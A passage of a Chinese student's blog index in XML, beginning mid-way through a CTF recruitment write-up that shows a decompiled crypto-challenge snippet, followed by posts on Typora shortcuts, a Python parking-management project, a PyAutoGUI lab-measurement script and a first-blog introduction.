number">71</span><span class="token punctuation">,</span>        <span class="token number">72</span><span class="token punctuation">,</span>        <span class="token number">129</span><span class="token punctuation">,</span>        <span class="token number">139</span><span class="token punctuation">,</span>        <span class="token number">100</span><span class="token punctuation">,</span>        <span class="token number">63</span><span class="token punctuation">,</span>        <span class="token number">133</span><span class="token punctuation">,</span>        <span class="token number">42</span><span class="token punctuation">,</span>        <span class="token number">125</span><span class="token punctuation">,</span>        <span class="token number">74</span><span class="token punctuation">,</span>        <span class="token number">88</span><span class="token punctuation">,</span>        <span class="token number">143</span><span class="token punctuation">,</span>        <span class="token number">144</span><span class="token punctuation">,</span>        <span class="token number">38</span><span class="token punctuation">,</span>        <span class="token number">140</span><span class="token punctuation">,</span>        <span class="token number">67</span><span class="token punctuation">,</span>        <span class="token number">119</span><span class="token punctuation">,</span>        <span class="token number">136</span><span class="token punctuation">,</span>        <span class="token number">115</span><span class="token punctuation">,</span>        <span class="token number">54</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">50</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">128</span><span class="token punctuation">,</span>        <span class="token number">57</span><span class="token punctuation">,</span>        <span class="token number">112</span><span class="token punctuation">,</span>        <span class="token number">43</span><span class="token punctuation">,</span>        <span class="token number">84</span><span class="token punctuation">,</span>        <span class="token number">70</span><span class="token punctuation">,</span>        <span class="token number">78</span><span class="token punctuation">,</span>        <span class="token number">28</span><span class="token punctuation">,</span>        <span class="token number">41</span><span class="token punctuation">,</span>        <span class="token number">93</span><span class="token punctuation">,</span>        <span class="token number">44</span><span class="token punctuation">,</span>        <span class="token number">13</span><span class="token punctuation">,</span>        <span class="token number">18</span><span class="token punctuation">,</span>        <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token number">48</span><span class="token punctuation">,</span>        <span class="token number">27</span><span class="token punctuation">,</span>        <span class="token number">83</span><span class="token punctuation">,</span>        <span class="token number">65</span><span class="token punctuation">,</span>        <span class="token number">17</span><span class="token punctuation">,</span>        <span class="token number">75</span><span class="token punctuation">,</span>        <span class="token number">126</span><span class="token punctuation">,</span>        <span class="token number">39</span><span class="token punctuation">,</span>        <span class="token number">49</span><span class="token punctuation">,</span>        <span class="token number">91</span><span class="token punctuation">,</span>        <span class="token number">34</span><span class="token punctuation">,</span>        <span class="token number">82</span><span class="token punctuation">,</span>        <span class="token number">45</span><span class="token punctuation">,</span>        <span class="token number">148</span><span class="token punctuation">,</span>        <span class="token number">105</span><span class="token punctuation">,</span>        <span class="token number">89</span><span class="token punctuation">,</span>        <span class="token number">117</span><span class="token punctuation">]</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">lambda</span> <span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">continue</span><span class="token punctuation">[</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">.</span><span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>filter<span class="token punctuation">(</span>check_prime<span class="token punctuation">,</span> test<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> key<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> generate_key<span class="token punctuation">(</span><span class="token punctuation">)</span>    msg <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">21</span><span class="token punctuation">,</span>        <span class="token number">167</span><span class="token punctuation">,</span>        <span class="token number">66</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">27</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">119</span><span class="token punctuation">,</span>        <span class="token number">42</span><span class="token punctuation">,</span>        <span class="token number">99</span><span class="token punctuation">,</span>        <span class="token number">68</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">13</span><span class="token punctuation">,</span>        <span class="token number">166</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">120</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">59</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">40</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">233</span><span class="token punctuation">,</span>        <span class="token number">41</span><span class="token punctuation">,</span>        <span class="token number">67</span><span class="token punctuation">,</span>        <span class="token number">108</span><span class="token punctuation">,</span>        <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token number">179</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token number">31</span><span class="token punctuation">,</span>        <span class="token number">107</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token number">75</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'encryt message is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><code>lambda .0: continue[ i for i in .0 ]</code> 这个<code>.0</code>执行不了啊emmm</p><p>我换成x也报错唉！</p><h2 id="middle-pwn"><a href="#middle-pwn" class="headerlink" title="middle_pwn"></a>middle_pwn</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213404793.png" alt="image-20191117213404793"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213417542.png" alt="image-20191117213417542"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/%E6%A6%9C%E5%8D%95.png" alt="榜单.png"> </p><p>第一次打CTF呢，虽然只拿了个第六，还拿了个娃娃233  </p><p>除了石榴园的真的没多少打这个比赛的呀。  </p><p>我好菜啊，这次一题pwn都没写出来，好难过嘤嘤嘤    </p><p>现场查BurpSuite怎么用也是绝了（那节培训我没去emmm   </p><p>总之CTF还是挺好玩的哈哈哈哈，有空还是要好好学一波呢！ </p><blockquote><p><del>等我有空再折腾一下，搭个博客吧 咕咕咕</del></p></blockquote><blockquote><p>20191128 更新：<br>我来折腾了，嘻嘻嘻！   </p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2019/11/28/test/"/>
      <url>/2019/11/28/test/</url>
      
        <content type="html"><![CDATA[<h1 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h1><p>再来一下哈~</p><p>喵~~<br><strong>嘿嘿嘿</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typora_tips 一些关于typora的快捷键</title>
      <link href="/2019/08/29/typora_tips/"/>
      <url>/2019/08/29/typora_tips/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>​        随便练练typora，参考了一些网上的资料，顺便记录一下，方便后面查阅哈~</p><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a><strong>标题</strong></h2><p><code>ctrl + 数字键</code></p><p>最多支持到六级标题</p><blockquote><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1></blockquote><blockquote><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2></blockquote><blockquote><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3></blockquote><blockquote><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4></blockquote><blockquote><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5></blockquote><blockquote><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6></blockquote><h3 id="取消标题"><a href="#取消标题" class="headerlink" title="取消标题"></a><strong>取消标题</strong></h3><p>​    <code>ctrl + 数字0</code></p><blockquote><h5 id="标题-1"><a href="#标题-1" class="headerlink" title="标题"></a>标题</h5><p>取消标题</p></blockquote><h2 id="加粗"><a href="#加粗" class="headerlink" title="加粗"></a><strong>加粗</strong></h2><p><code>ctrl + B</code></p><blockquote><p><strong>这是加粗</strong></p></blockquote><h2 id="倾斜"><a href="#倾斜" class="headerlink" title="倾斜"></a><strong>倾斜</strong></h2><p><code>ctrl + I</code></p><blockquote><p><em>这是倾斜</em></p></blockquote><h2 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a><strong>下划线</strong></h2><p><code>ctrl + U</code></p><blockquote><p><u>这是下划线</u></p></blockquote><h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a><strong>删除线</strong></h2><p><code>alt + shift + 5</code></p><blockquote><p><del>这是删除线</del></p></blockquote><hr><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a><strong>无序列表</strong></h2> <a id="more"></a> <p><code>- + space + enter</code></p><blockquote><ul><li><p>miao </p></li><li><p>miaomiao!</p><ul><li><p>嵌套</p><ul><li>再来嵌套</li></ul></li><li><p>上一个层次</p></li></ul></li><li><p>喵！</p></li></ul></blockquote><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a><strong>有序列表</strong></h2><p><code>数字键. + space + enter</code></p><ol><li>第一个</li><li>第二个<ol><li>嵌套一下</li><li>再来一下<ol><li>再嵌套一个</li></ol></li><li>继续</li></ol></li><li>继续来</li><li>就这样吧</li></ol><h2 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a><strong>任务列表</strong></h2><p><code>- []</code> TODO</p><p><code>- [x]</code>已完成</p><blockquote><ul><li><input disabled="" type="checkbox"> 这是待完成的</li><li><input checked="" disabled="" type="checkbox"> 这个已完成了</li></ul></blockquote><hr><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a><strong>引用</strong></h2><p><code>&gt; + space + enter</code></p><p>或者</p><p><code>ctrl + shift + Q</code></p><blockquote><p>这就是引用</p></blockquote><blockquote><p>这也是</p><blockquote><p>​    还可以嵌套引用</p><blockquote><p>​    再来一个</p></blockquote><p>这也行</p></blockquote><p>一样的</p></blockquote><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a><strong>插入图片</strong></h2><p><code>ctrl + shift + I</code></p><p>网上说用<code>MPic</code>做图床挺不错的。（还没试过</p><p><img src="/2019/08/29/typora_tips/cat.jpg" alt="喵啊"></p><p>直接拖进来也行</p><h2 id="插入链接"><a href="#插入链接" class="headerlink" title="插入链接"></a><strong>插入链接</strong></h2><p><code>ctrl + K</code></p><blockquote><p><a href="https://miaotony.github.io" target="_blank" rel="noopener">这是链接，跳转到我的博客哈</a></p></blockquote><h2 id="插入表格"><a href="#插入表格" class="headerlink" title="插入表格"></a><strong>插入表格</strong></h2><p><code>ctrl + T</code></p><table><thead><tr><th>mm</th><th>text</th></tr></thead><tbody><tr><td>测试</td><td>再测试</td></tr><tr><td>123</td><td>456</td></tr></tbody></table><h2 id="插入代码"><a href="#插入代码" class="headerlink" title="插入代码"></a><strong>插入代码</strong></h2><h3 id="单行代码（文中的代码）"><a href="#单行代码（文中的代码）" class="headerlink" title="单行代码（文中的代码）"></a>单行代码（文中的代码）</h3><p>ctrl + shift + `</p><blockquote><p>`输入代码`</p></blockquote><h3 id="多行代码（代码块）"><a href="#多行代码（代码块）" class="headerlink" title="多行代码（代码块）"></a>多行代码（代码块）</h3><p><code>ctrl + shift + K</code></p><blockquote><p>``` </p><p>输入代码</p><p>```</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello world!\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Python</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, this is C."</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// C</span></code></pre><pre class=" language-matlab"><code class="language-matlab"><span class="token function">disp</span><span class="token punctuation">(</span>"Hello<span class="token punctuation">,</span> this is MATLAB<span class="token punctuation">.</span>"<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">% MATLAB</span></code></pre><pre class=" language-lua"><code class="language-lua"><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello, this is lua."</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">-- lua</span></code></pre><h2 id="插入表情"><a href="#插入表情" class="headerlink" title="插入表情"></a><strong>插入表情</strong></h2><p><code>:名称:</code></p><p>(英文状态下)</p><p><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f431.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f431.png?v8">🐱</span> <span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f436.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f436.png?v8">🐶</span></p><p><img src="/2019/08/29/typora_tips/1.png" alt="示例"></p><p>PS：微软输入法可以用<code>ctrl + shift + B</code>弹出表情窗口。</p><p>😀👌</p><h2 id="插入分割线"><a href="#插入分割线" class="headerlink" title="插入分割线"></a><strong>插入分割线</strong></h2><p><code>---</code></p><blockquote><p>下面是分割线</p><hr></blockquote><h2 id="插入高亮显示"><a href="#插入高亮显示" class="headerlink" title="插入高亮显示"></a><strong>插入高亮显示</strong></h2><p><code>==中间写文字==</code></p><blockquote><p>==这是高亮==</p></blockquote><h2 id="插入脚注"><a href="#插入脚注" class="headerlink" title="插入脚注"></a><strong>插入脚注</strong></h2><p><code>文字[^脚注]</code></p><blockquote><p>示例<a href="这是脚注啦。">^1</a></p></blockquote><h2 id="插入公式"><a href="#插入公式" class="headerlink" title="插入公式"></a><strong>插入公式</strong></h2><p><code>ctrl + shift + M</code></p><p>或者</p><p>行内公式（内联公式）：  <code>$公式$</code></p><p>行间公式：     <code>$$ 公式 $$</code></p><p>$$<br>\lim_{x\to +\infty} \frac{1}{x}=0<br>$$<br>加个框试试（<code>\boxed{}</code>）：<br>$$<br>\boxed{ \overrightarrow{AB}}<br>$$</p><blockquote><p>这是行内公式 $ \sqrt[3]{test} $ ，妙啊~</p></blockquote><p>具体的还得慢慢看呢。</p><p>顺便学一波<code>LaTex</code>也挺不错的~</p><h2 id="插入目录"><a href="#插入目录" class="headerlink" title="插入目录"></a><strong>插入目录</strong></h2><p><code>[toc]  + ENTER</code></p><blockquote><p>就是最上面那个啦~</p></blockquote><hr><h2 id="新建文件"><a href="#新建文件" class="headerlink" title="新建文件"></a><strong>新建文件</strong></h2><p><code>ctrl + N</code>    </p><h2 id="选中中文-英文"><a href="#选中中文-英文" class="headerlink" title="选中中文/英文"></a><strong>选中中文/英文</strong></h2><p><code>ctrl + D</code></p><p>miao miao~ </p><p><code>ctrl + Shift + 左/右</code> 快速选中整个词语/单词。</p><h2 id="选中整行"><a href="#选中整行" class="headerlink" title="选中整行"></a><strong>选中整行</strong></h2><p><code>ctrl + L</code></p><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a><strong>查找</strong></h2><p><code>ctrl + F</code></p><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a><strong>替换</strong></h2><p><code>ctrl + H</code></p><h2 id="跳转到开头-结尾"><a href="#跳转到开头-结尾" class="headerlink" title="跳转到开头/结尾"></a><strong>跳转到开头/结尾</strong></h2><p><code>ctrl + HOME</code> 跳转至文章开头</p><p><code>ctrl + END</code>   跳转至文章末尾</p><h2 id="打开文件（笔记）"><a href="#打开文件（笔记）" class="headerlink" title="打开文件（笔记）"></a><strong>打开文件（笔记）</strong></h2><p><code>ctrl + P</code></p><h2 id="全屏显示"><a href="#全屏显示" class="headerlink" title="全屏显示"></a><strong>全屏显示</strong></h2><p><code>F11</code></p><h2 id="侧边栏"><a href="#侧边栏" class="headerlink" title="侧边栏"></a><strong>侧边栏</strong></h2><p><code>ctrl + shift + L</code></p><h2 id="清除格式"><a href="#清除格式" class="headerlink" title="清除格式"></a><strong>清除格式</strong></h2><p><code>ctrl + \</code></p><h2 id="切换到代码模式"><a href="#切换到代码模式" class="headerlink" title="切换到代码模式"></a><strong>切换到代码模式</strong></h2><p><code>ctrl + /</code></p><p><strong><em>==etc.==</em></strong></p><p>还有挺多还要慢慢去发掘呢~</p><hr><p>顺便说一下</p><p><code>Snipaste</code> 这个截图工具挺强大的</p><p><a href="https://zh.snipaste.com/" target="_blank" rel="noopener">官网</a> <a href="https://zh.snipaste.com/" target="_blank" rel="noopener">https://zh.snipaste.com/</a></p><blockquote><p>本文搬运自我的csdn博客啦~</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
            <tag> Markdown </tag>
            
            <tag> Typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 开源一个自己的Python小项目「Park at ease」停车场管理系统</title>
      <link href="/2019/08/18/Park_at_ease/"/>
      <url>/2019/08/18/Park_at_ease/</url>
      
        <content type="html"><![CDATA[<h1 id="Park-at-ease"><a href="#Park-at-ease" class="headerlink" title="Park at ease"></a>Park at ease</h1><p><strong>停车场管理系统</strong><br><em>基于Python实现</em>  </p><p><strong>Park Management System</strong><br><em>Based on Python…</em>    </p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Hello, this is Park_at_ease!'</span><span class="token punctuation">)</span></code></pre><p><img src="/2019/08/18/Park_at_ease/20190818195449125.png" alt="运行界面"></p><h2 id="一些说明"><a href="#一些说明" class="headerlink" title="一些说明"></a>一些说明</h2><p>这个项目本来是给部门里小干事布置的《2019寒假进阶指南》里 Section2 的课设任务（题目基本上是根据自己的想法出的），当时自己正好在学Python，就想拿这个项目练练手，于是就有了这个基于Python面向对象实现的停车场管理系统。  </p><p>原来这个项目都是自己弄着玩的，这几天整理文件发现几个月前还写了这玩意儿，还挺有意思的。<br>这个项目其实还有很多可以开发的空间的，于是就想着把它开源了吧，希望大家可以一起来完善呢！  </p><p><em>PS:原则上不提供技术支持哈。</em></p><hr><p><strong>项目网站（基于Github Pages搭建）：</strong><br><a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">来点我哈</a> 或 <a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">https://miaotony.github.io/Park_at_ease/</a></p><p><strong>GitHub项目网址：</strong><br><a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">来点我鸭</a> 或 <a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">https://github.com/miaotony/Park_at_ease</a></p><p>欢迎大家在此基础上继续完善鸭~<br><strong>欢迎Star、Fork、提PR &amp; issue！</strong></p><p><strong>使用及转载时请注明出处，保留作者信息，严禁商用，严禁用于完成课设任务，谢谢！</strong>  </p><hr><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2> <a id="more"></a> <p>这是编者参考了一小部分网络上相关的题目，结合实际生活，融合了自己一些想到的，给小干事们出的题目。<br>这里直接就截屏放出来吧，PDF还有别的内容懒得改了。<br>如果有什么建议<strong>欢迎在GitHub上提issue</strong>或者<strong>在这里评论</strong>哈~！  </p><p><img src="/2019/08/18/Park_at_ease/20190818165341354.png" alt="20190818165341354">  </p><p><img src="/2019/08/18/Park_at_ease/20190818165453514.png" alt="20190818165453514"></p><p><img src="/2019/08/18/Park_at_ease/20190818165508495.png" alt="20190818165508495"></p><p><img src="/2019/08/18/Park_at_ease/20190818165517893.png" alt="20190818165517893"></p><p><img src="/2019/08/18/Park_at_ease/20190818165530183.png" alt="20190818165530183"></p><p><img src="/2019/08/18/Park_at_ease/20190818165538685.png" alt="20190818165538685"></p><p><img src="/2019/08/18/Park_at_ease/20190818165548553.png" alt="20190818165548553"></p><hr><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked="" disabled="" type="checkbox"> 管理员界面 Administrator Interface  </li><li><input checked="" disabled="" type="checkbox"> 文件操作 FileIO</li><li><input checked="" disabled="" type="checkbox"> 登录界面 Login  </li><li><input disabled="" type="checkbox"> 登录加密 Login Encryption</li><li><input disabled="" type="checkbox"> 图形界面 GUI  </li><li><input disabled="" type="checkbox"> 多线程或多进程 Multithreading or Multiprocessing  </li><li><input disabled="" type="checkbox"> 邮件推送 Email Push  </li><li><input disabled="" type="checkbox"> 微信推送 WeChat Push  </li><li><input disabled="" type="checkbox"> TCP  </li><li><input disabled="" type="checkbox"> 嵌入式开发 Embedded Development<br>  etc.  </li></ul><hr><p><strong>具体请移步到GitHub鸭！</strong></p><p><strong>项目网站（基于Github Pages搭建）：</strong><br><a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">来点我哈</a> 或 <a href="https://miaotony.github.io/Park_at_ease/" target="_blank" rel="noopener">https://miaotony.github.io/Park_at_ease/</a></p><p><strong>GitHub项目网址：</strong><br><a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">来点我鸭</a> 或 <a href="https://github.com/miaotony/Park_at_ease" target="_blank" rel="noopener">https://github.com/miaotony/Park_at_ease</a></p><p><img src="/2019/08/18/Park_at_ease/20190818195154540.png" alt="喵~"></p><p>溜了溜了<br>下次再见啦~</p><blockquote><p>搬运自我的csdn博客啦~</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于模拟点击实现数据自动测量</title>
      <link href="/2019/07/10/Idea_AutoMeasure/"/>
      <url>/2019/07/10/Idea_AutoMeasure/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运一篇之前写的小想法啦~</p></blockquote><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>人工智能——先人工后智能<br>哪里有现成数据给你<br>还不是人工手动去测……  </p><p>大创要测数据emmm，简单来说就是点点按钮，等它数据测量完成，然后按照命名规范保存。<br>就是这个也太枯燥了8，效率还低。<br>不如py一下写个自动执行的！<br>说写就写呗<em>（斜眼笑.gif)</em>  </p><h2 id="初代版本"><a href="#初代版本" class="headerlink" title="初代版本"></a>初代版本</h2><p>发现Python有个现成的第三方库叫<code>PyAutoGui</code>库，它给的函数还是挺方便的。<br>按照测数据操作的流程用代码还原一遍，测试发现速度太快了电脑吃不消，于是乎到处加延时233。  </p><p>总之还是挺不错的吧<br>输入<strong>角度、次数、开始index</strong>（程序崩的时候备用），<br>然后就可以自动开始测量，新建文件夹，按顺序命名保存。  </p><p><img src="/2019/07/10/Idea_AutoMeasure/code.png" alt="code1"></p><p><img src="/2019/07/10/Idea_AutoMeasure/code2.png" alt="code2"></p><p><img src="/2019/07/10/Idea_AutoMeasure/code3.png" alt="code3"></p><p>理论一天可测的数据量从270组提高到435组，<strong>效率提升了61%吧！</strong>  </p><p>还要感谢潇潇弟弟陪我debug 嘻嘻嘻~  </p><hr><h2 id="升级版"><a href="#升级版" class="headerlink" title="升级版"></a>升级版</h2><blockquote><p><em>Update on 20190725.</em></p></blockquote><p>之前写的自动测数据的程序还有点小问题，今天又更新了两个版本。。</p><p>由于测量软件的问题，每组都会漏一些数据，所以还要手动补测。</p><p>于是乎今天加了个文件是否存在的判断，确定保存成功之后才继续下一组测量，这样就不用补测了！  </p><p>另外还加入了log，记录日志文件方便检查错误。</p><p>嘿嘿嘿~</p><p><img src="/2019/07/10/Idea_AutoMeasure/update1.png" alt="update"></p><p><img src="/2019/07/10/Idea_AutoMeasure/update2.png" alt="运行界面"></p><p><img src="/2019/07/10/Idea_AutoMeasure/log.png" alt="log"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> 模拟点击 </tag>
            
            <tag> 大创 </tag>
            
            <tag> 自动 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇 随便写写</title>
      <link href="/2019/07/09/FirstBlog/"/>
      <url>/2019/07/09/FirstBlog/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p>搬运自我的CSDN博客 </p></blockquote><p>这篇可以算是第一次公开发出来的吧<br><em>（其实严格来说也不算啦，只是之前发的年份过久估计都404或者找不到了233</em></p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, everyone!"</span><span class="token punctuation">)</span></code></pre><h2 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h2><p>  上了大学之后，做大作业、写论文、写报告、做项目、参加各种比赛，经常需要各种找资料，大多是<em>EE</em>和<em>CS</em>方向的。</p><p>这时候经常就逛到CSDN、博客园、简书、逼乎之类的这些，或者大佬们自己搭建的博客，当然还有B站这样有着各种学习视频的好地方。</p><p>大家都乐于把自己的体会和经验分享出来，对于我这样的菜鸡来说帮助很大鸭。比如说码着码着代码遇到啥bug了，然后上来一查，很多时候别人也遇到过，于是乎什么情况下遇到的、如何解决的大都有了，很方便就能解决问题呢。</p><p>其实本来就觉得写点东西挺有意思的，特别是看到身边的小伙伴在CSDN上也开了自己的账号，开始分享自己的一些 debug 经历以及生活常事，越发觉得挺有意思的也挺有意义的。于是我也来写一写呗。 </p><p>登录的时候突然才发现，CSDN上我的账号原来7年前就注册了，估计之前还只是随便逛逛以及下载些资料，都没有在这儿写过啥东西233。没事问题不大哈哈哈。</p><hr><h2 id="When"><a href="#When" class="headerlink" title="When?"></a>When?</h2><p>其实之前有啥小想法或者小制作，都是随便写两句话讲讲到空间……<br>当然，<strong>有想法</strong> &amp;&amp; <strong>有空</strong> 的时候，就来这儿写点东西吧！</p><hr><h2 id="What"><a href="#What" class="headerlink" title="What?"></a>What?</h2><p>其实我感兴趣的东西挺多的 emmm<br>比如说大体说一说嘛：</p><ul><li><h4 id="嵌入式相关"><a href="#嵌入式相关" class="headerlink" title="嵌入式相关"></a>嵌入式相关</h4><ul><li>MCU单片机</li><li>FPGA</li><li>物联网 IoT<ul><li>ESP8266<br>（准备好好研究一波，可以单独列一列）</li></ul></li></ul></li><li><h4 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h4><ul><li>Python 以及各种库</li><li>MATLAB  </li></ul></li><li><h4 id="人工智能-AI"><a href="#人工智能-AI" class="headerlink" title="人工智能 AI"></a>人工智能 AI</h4><ul><li>机器学习 Machine Learning，ML </li></ul></li><li><h4 id="计算机视觉-Computer-Vision，CV"><a href="#计算机视觉-Computer-Vision，CV" class="headerlink" title="计算机视觉 Computer Vision，CV"></a>计算机视觉 Computer Vision，CV</h4></li><li><h4 id="数据分析与挖掘"><a href="#数据分析与挖掘" class="headerlink" title="数据分析与挖掘"></a>数据分析与挖掘</h4><ul><li>数据获取（如爬虫虫）</li><li>数据可视化</li></ul></li><li><p>数据挖掘</p></li><li><h4 id="微信小程序开发"><a href="#微信小程序开发" class="headerlink" title="微信小程序开发"></a>微信小程序开发</h4></li><li><h4 id="前端尝个鲜"><a href="#前端尝个鲜" class="headerlink" title="前端尝个鲜"></a>前端尝个鲜</h4></li><li><h4 id="视频制作"><a href="#视频制作" class="headerlink" 